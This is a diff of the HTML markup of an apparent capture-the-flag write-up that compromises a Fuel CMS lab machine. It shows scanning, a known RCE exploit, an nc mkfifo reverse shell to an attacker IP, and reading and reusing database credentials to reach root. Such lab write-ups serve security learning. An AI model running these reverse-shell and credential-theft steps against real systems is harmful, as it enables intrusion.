@@ -70,7 +70,7 @@
 <p>target - 10.201.65.81</p>
 <p>nmap</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code>PORT   STATE SERVICE REASON         VERSION
+<pre class="codehilite"><code>PORT   STATE SERVICE REASON         VERSION
 80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
 |_http-title: Welcome to FUEL CMS
 | http-robots.txt: 1 disallowed entry 
@@ -78,30 +78,30 @@
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 | http-methods: 
 |_  Supported Methods: GET HEAD POST OPTIONS
-</code></pre></div>
+</code></pre>
 
 <blockquote>
 <p>Find webpotral and saw  <code>Fuel CMS</code>  so search vaulnerbility wia searchploit</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code><span class="c">┌──(alucard㉿alucard)</span><span class="nb">-</span><span class="k">[</span><span class="c">~</span><span class="k">]</span>
-<span class="c">└─$ searchsploit fuel cms</span>
-<span class="nb">--------------------------------------------------------------------------------------</span><span class="c"> </span><span class="nb">---------------------------------</span>
-<span class="c"> Exploit Title                                                                        |  Path</span>
-<span class="nb">--------------------------------------------------------------------------------------</span><span class="c"> </span><span class="nb">---------------------------------</span>
-<span class="c">fuel CMS 1</span><span class="nt">.</span><span class="c">4</span><span class="nt">.</span><span class="c">1 </span><span class="nb">-</span><span class="c"> Remote Code Execution (1)                                            | linux/webapps/47138</span><span class="nt">.</span><span class="c">py</span>
-<span class="c">Fuel CMS 1</span><span class="nt">.</span><span class="c">4</span><span class="nt">.</span><span class="c">1 </span><span class="nb">-</span><span class="c"> Remote Code Execution (2)                                            | php/webapps/49487</span><span class="nt">.</span><span class="c">rb</span>
-<span class="c">Fuel CMS 1</span><span class="nt">.</span><span class="c">4</span><span class="nt">.</span><span class="c">1 </span><span class="nb">-</span><span class="c"> Remote Code Execution (3)                                            | php/webapps/50477</span><span class="nt">.</span><span class="c">py</span>
-<span class="c">Fuel CMS 1</span><span class="nt">.</span><span class="c">4</span><span class="nt">.</span><span class="c">13 </span><span class="nb">-</span><span class="c"> &#39;col&#39; Blind SQL Injection (Authenticated)                           | php/webapps/50523</span><span class="nt">.</span><span class="c">txt</span>
-<span class="c">Fuel CMS 1</span><span class="nt">.</span><span class="c">4</span><span class="nt">.</span><span class="c">7 </span><span class="nb">-</span><span class="c"> &#39;col&#39; SQL Injection (Authenticated)                                  | php/webapps/48741</span><span class="nt">.</span><span class="c">txt</span>
-<span class="c">Fuel CMS 1</span><span class="nt">.</span><span class="c">4</span><span class="nt">.</span><span class="c">8 </span><span class="nb">-</span><span class="c"> &#39;fuel_replace_id&#39; SQL Injection (Authenticated)                      | php/webapps/48778</span><span class="nt">.</span><span class="c">txt</span>
-<span class="c">Fuel CMS 1</span><span class="nt">.</span><span class="c">5</span><span class="nt">.</span><span class="c">0 </span><span class="nb">-</span><span class="c"> Cross</span><span class="nb">-</span><span class="c">Site Request Forgery (CSRF)                                    | php/webapps/50884</span><span class="nt">.</span><span class="c">txt</span>
-<span class="nb">--------------------------------------------------------------------------------------</span><span class="c"> </span><span class="nb">-------------------------</span>
-</code></pre></div>
+<pre class="codehilite"><code>┌──(alucard㉿alucard)-[~]
+└─$ searchsploit fuel cms
+-------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                        |  Path
+-------------------------------------------------------------------------------------- ---------------------------------
+fuel CMS 1.4.1 - Remote Code Execution (1)                                            | linux/webapps/47138.py
+Fuel CMS 1.4.1 - Remote Code Execution (2)                                            | php/webapps/49487.rb
+Fuel CMS 1.4.1 - Remote Code Execution (3)                                            | php/webapps/50477.py
+Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                           | php/webapps/50523.txt
+Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                  | php/webapps/48741.txt
+Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                      | php/webapps/48778.txt
+Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                                    | php/webapps/50884.txt
+-------------------------------------------------------------------------------------- -------------------------
+</code></pre>
 
 <blockquote>
 <p>So in exploit tb found script in this cve using this cv i can run command</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code>❯ ls
+<pre class="codehilite"><code>❯ ls
 blog  exploit.py  ignite  rabithole  valley
 ❯ chmod +x exploit.py
 ❯ python exploit.py
@@ -110,109 +110,109 @@ usage: python3 exploit.py -u &lt;url&gt;
 [+]Connecting...
 Enter Command $whoami
 systemwww-data
-</code></pre></div>
+</code></pre>
 
 <blockquote>
 <p>So i run reverse shell in this command line</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code>Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.21.16.42 4242 &gt;/tmp/f
-</code></pre></div>
+<pre class="codehilite"><code>Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.21.16.42 4242 &gt;/tmp/f
+</code></pre>
 
 <blockquote>
 <p>after gaining access to shell stable it</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">nvlp</span><span class="w"> </span><span class="mi">4242</span>
-<span class="n">listening</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="p">[</span><span class="nb">any</span><span class="p">]</span><span class="w"> </span><span class="mi">4242</span><span class="w"> </span><span class="o">...</span>
-<span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="p">[</span><span class="mf">10.21.16.42</span><span class="p">]</span><span class="w"> </span><span class="kn">from</span><span class="w"> </span><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mf">10.201.65.81</span><span class="p">]</span><span class="w"> </span><span class="mi">38412</span>
-<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span><span class="w"> </span><span class="n">can</span><span class="s1">&#39;t access tty; job control turned off</span>
-<span class="err">$</span><span class="w"> </span>
-<span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
-</code></pre></div>
+<pre class="codehilite"><code>❯ nc -nvlp 4242
+listening on [any] 4242 ...
+connect to [10.21.16.42] from (UNKNOWN) [10.201.65.81] 38412
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
 
 <blockquote>
 <p>So i find flag.txt in</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="err">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">www</span><span class="o">-</span><span class="k">data</span>
-<span class="n">cd</span><span class="w"> </span><span class="n">www</span><span class="o">-</span><span class="k">data</span>
-<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
-<span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span>
-<span class="n">total</span><span class="w"> </span><span class="mi">12</span>
-<span class="n">drwx</span><span class="o">--</span><span class="n">x</span><span class="o">--</span><span class="n">x</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="w"> </span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2019</span><span class="w"> </span><span class="p">.</span>
-<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">     </span><span class="mi">4096</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2019</span><span class="w"> </span><span class="p">..</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w">     </span><span class="n">root</span><span class="w">       </span><span class="mi">34</span><span class="w"> </span><span class="n">Jul</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2019</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
-<span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
-</code></pre></div>
+<pre class="codehilite"><code>www-data@ubuntu:/home$ cd www-data
+cd www-data
+www-data@ubuntu:/home/www-data$ ls -la
+ls -la
+total 12
+drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .
+drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..
+-rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt
+www-data@ubuntu:/home/www-data$ cat flag.txt
+</code></pre>
 
 <blockquote>
 <p>So I invistigate more in this shell</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">$</span><span class="w"> </span><span class="n">ls</span>
-<span class="n">ls</span>
-<span class="n">backups</span><span class="w">  </span><span class="n">crash</span><span class="w">  </span><span class="n">local</span><span class="w">  </span><span class="nb">log</span><span class="w">   </span><span class="n">metrics</span><span class="w">  </span><span class="n">run</span><span class="w">   </span><span class="n">spool</span><span class="w">  </span><span class="n">www</span>
-<span class="n">cache</span><span class="w">    </span><span class="n">lib</span><span class="w">    </span><span class="n">lock</span><span class="w">   </span><span class="n">mail</span><span class="w">  </span><span class="n">opt</span><span class="w">      </span><span class="n">snap</span><span class="w">  </span><span class="n">tmp</span>
-<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">www</span>
-<span class="n">cd</span><span class="w"> </span><span class="n">www</span>
-<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">html</span>
-<span class="n">cd</span><span class="w"> </span><span class="n">html</span>
-<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span><span class="w"> </span><span class="n">ls</span>
-<span class="n">ls</span>
-<span class="n">README</span><span class="o">.</span><span class="n">md</span><span class="w">  </span><span class="n">assets</span><span class="w">  </span><span class="n">composer</span><span class="o">.</span><span class="n">json</span><span class="w">  </span><span class="n">contributing</span><span class="o">.</span><span class="n">md</span><span class="w">  </span><span class="n">fuel</span><span class="w">  </span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="w">  </span><span class="n">robots</span><span class="o">.</span><span class="n">txt</span>
-<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">fuel</span>
-<span class="n">cd</span><span class="w"> </span><span class="n">fuel</span>
-<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">fuel</span><span class="o">$</span><span class="w"> </span><span class="n">ls</span>
-<span class="n">ls</span>
-<span class="n">application</span><span class="w">  </span><span class="n">data_backup</span><span class="w">  </span><span class="n">install</span><span class="w">   </span><span class="n">modules</span>
-<span class="n">codeigniter</span><span class="w">  </span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="w">    </span><span class="n">licenses</span><span class="w">  </span><span class="n">scripts</span>
-<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">fuel</span><span class="o">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">application</span>
-<span class="n">cd</span><span class="w"> </span><span class="n">application</span>
-<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">fuel</span><span class="o">/</span><span class="n">application</span><span class="o">$</span><span class="w"> </span><span class="n">ls</span>
-<span class="n">ls</span>
-<span class="n">cache</span><span class="w">   </span><span class="n">controllers</span><span class="w">  </span><span class="n">helpers</span><span class="w">  </span><span class="n">index</span><span class="o">.</span><span class="n">html</span><span class="w">  </span><span class="n">libraries</span><span class="w">  </span><span class="n">migrations</span><span class="w">  </span><span class="n">third_party</span>
-<span class="n">config</span><span class="w">  </span><span class="n">core</span><span class="w">         </span><span class="n">hooks</span><span class="w">    </span><span class="n">language</span><span class="w">    </span><span class="n">logs</span><span class="w">       </span><span class="n">models</span><span class="w">      </span><span class="n">views</span>
-<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">fuel</span><span class="o">/</span><span class="n">application</span><span class="o">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="n">config</span>
-<span class="n">cd</span><span class="w"> </span><span class="n">config</span>
-<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">fuel</span><span class="o">/</span><span class="n">application</span><span class="o">/</span><span class="n">config</span><span class="o">$</span><span class="w"> </span><span class="n">ls</span>
-<span class="n">ls</span>
-<span class="n">MY_config</span><span class="o">.</span><span class="n">php</span><span class="w">        </span><span class="n">constants</span><span class="o">.</span><span class="n">php</span><span class="w">      </span><span class="n">google</span><span class="o">.</span><span class="n">php</span><span class="w">     </span><span class="n">profiler</span><span class="o">.</span><span class="n">php</span>
-<span class="n">MY_fuel</span><span class="o">.</span><span class="n">php</span><span class="w">          </span><span class="n">custom_fields</span><span class="o">.</span><span class="n">php</span><span class="w">  </span><span class="n">hooks</span><span class="o">.</span><span class="n">php</span><span class="w">      </span><span class="n">redirects</span><span class="o">.</span><span class="n">php</span>
-<span class="n">MY_fuel_layouts</span><span class="o">.</span><span class="n">php</span><span class="w">  </span><span class="n">database</span><span class="o">.</span><span class="n">php</span><span class="w">       </span><span class="n">index</span><span class="o">.</span><span class="n">html</span><span class="w">     </span><span class="n">routes</span><span class="o">.</span><span class="n">php</span>
-<span class="n">MY_fuel_modules</span><span class="o">.</span><span class="n">php</span><span class="w">  </span><span class="n">doctypes</span><span class="o">.</span><span class="n">php</span><span class="w">       </span><span class="n">memcached</span><span class="o">.</span><span class="n">php</span><span class="w">  </span><span class="n">smileys</span><span class="o">.</span><span class="n">php</span>
-<span class="n">asset</span><span class="o">.</span><span class="n">php</span><span class="w">            </span><span class="n">editors</span><span class="o">.</span><span class="n">php</span><span class="w">        </span><span class="n">migration</span><span class="o">.</span><span class="n">php</span><span class="w">  </span><span class="n">social</span><span class="o">.</span><span class="n">php</span>
-<span class="n">autoload</span><span class="o">.</span><span class="n">php</span><span class="w">         </span><span class="n">environments</span><span class="o">.</span><span class="n">php</span><span class="w">   </span><span class="n">mimes</span><span class="o">.</span><span class="n">php</span><span class="w">      </span><span class="n">states</span><span class="o">.</span><span class="n">php</span>
-<span class="n">config</span><span class="o">.</span><span class="n">php</span><span class="w">           </span><span class="n">foreign_chars</span><span class="o">.</span><span class="n">php</span><span class="w">  </span><span class="n">model</span><span class="o">.</span><span class="n">php</span><span class="w">      </span><span class="n">user_agents</span><span class="o">.</span><span class="n">php</span>
-<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">fuel</span><span class="o">/</span><span class="n">application</span><span class="o">/</span><span class="n">config</span><span class="o">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">database</span><span class="o">.</span><span class="n">pgp</span>
-<span class="n">cat</span><span class="w"> </span><span class="n">database</span><span class="o">.</span><span class="n">pgp</span>
-<span class="n">cat</span><span class="p">:</span><span class="w"> </span><span class="n">database</span><span class="o">.</span><span class="n">pgp</span><span class="p">:</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">directory</span>
-<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">fuel</span><span class="o">/</span><span class="n">application</span><span class="o">/</span><span class="n">config</span><span class="o">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">database</span><span class="o">.</span><span class="n">php</span>
-</code></pre></div>
+<pre class="codehilite"><code>www-data@ubuntu:/var$ ls
+ls
+backups  crash  local  log   metrics  run   spool  www
+cache    lib    lock   mail  opt      snap  tmp
+www-data@ubuntu:/var$ cd www
+cd www
+www-data@ubuntu:/var/www$ cd html
+cd html
+www-data@ubuntu:/var/www/html$ ls
+ls
+README.md  assets  composer.json  contributing.md  fuel  index.php  robots.txt
+www-data@ubuntu:/var/www/html$ cd fuel
+cd fuel
+www-data@ubuntu:/var/www/html/fuel$ ls
+ls
+application  data_backup  install   modules
+codeigniter  index.php    licenses  scripts
+www-data@ubuntu:/var/www/html/fuel$ cd application
+cd application
+www-data@ubuntu:/var/www/html/fuel/application$ ls
+ls
+cache   controllers  helpers  index.html  libraries  migrations  third_party
+config  core         hooks    language    logs       models      views
+www-data@ubuntu:/var/www/html/fuel/application$ cd config
+cd config
+www-data@ubuntu:/var/www/html/fuel/application/config$ ls
+ls
+MY_config.php        constants.php      google.php     profiler.php
+MY_fuel.php          custom_fields.php  hooks.php      redirects.php
+MY_fuel_layouts.php  database.php       index.html     routes.php
+MY_fuel_modules.php  doctypes.php       memcached.php  smileys.php
+asset.php            editors.php        migration.php  social.php
+autoload.php         environments.php   mimes.php      states.php
+config.php           foreign_chars.php  model.php      user_agents.php
+www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.pgp
+cat database.pgp
+cat: database.pgp: No such file or directory
+www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php
+</code></pre>
 
 <blockquote>
 <p>So in this database found username and pwd</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code><span class="n">$db</span><span class="err">[</span><span class="s1">&#39;default&#39;</span><span class="err">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">array</span><span class="p">(</span>
-<span class="w">        </span><span class="s1">&#39;dsn&#39;</span><span class="w">   </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;hostname&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;username&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;root&#39;</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;password&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;mememe&#39;</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;database&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;fuel_schema&#39;</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;dbdriver&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;mysqli&#39;</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;dbprefix&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;pconnect&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="no">FALSE</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;db_debug&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">ENVIRONMENT</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s1">&#39;production&#39;</span><span class="p">),</span>
-<span class="w">        </span><span class="s1">&#39;cache_on&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="no">FALSE</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;cachedir&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;char_set&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;utf8&#39;</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;dbcollat&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;utf8_general_ci&#39;</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;swap_pre&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;encrypt&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="no">FALSE</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;compress&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="no">FALSE</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;stricton&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="no">FALSE</span><span class="p">,</span>
-<span class="w">        </span><span class="s1">&#39;failover&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">array</span><span class="p">(),</span>
-<span class="w">        </span><span class="s1">&#39;save_queries&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="no">TRUE</span>
-<span class="p">);</span>
-<span class="w">        </span><span class="n n-Quoted">`root`</span>
-<span class="w">        </span><span class="n n-Quoted">`mememe`</span>
-</code></pre></div>
+<pre class="codehilite"><code>$db['default'] = array(
+        'dsn'   =&gt; '',
+        'hostname' =&gt; 'localhost',
+        'username' =&gt; 'root',
+        'password' =&gt; 'mememe',
+        'database' =&gt; 'fuel_schema',
+        'dbdriver' =&gt; 'mysqli',
+        'dbprefix' =&gt; '',
+        'pconnect' =&gt; FALSE,
+        'db_debug' =&gt; (ENVIRONMENT !== 'production'),
+        'cache_on' =&gt; FALSE,
+        'cachedir' =&gt; '',
+        'char_set' =&gt; 'utf8',
+        'dbcollat' =&gt; 'utf8_general_ci',
+        'swap_pre' =&gt; '',
+        'encrypt' =&gt; FALSE,
+        'compress' =&gt; FALSE,
+        'stricton' =&gt; FALSE,
+        'failover' =&gt; array(),
+        'save_queries' =&gt; TRUE
+);
+        `root`
+        `mememe`
+</code></pre>
 
 <blockquote>
 <p>So using pwd login to root and find root.txt</p>
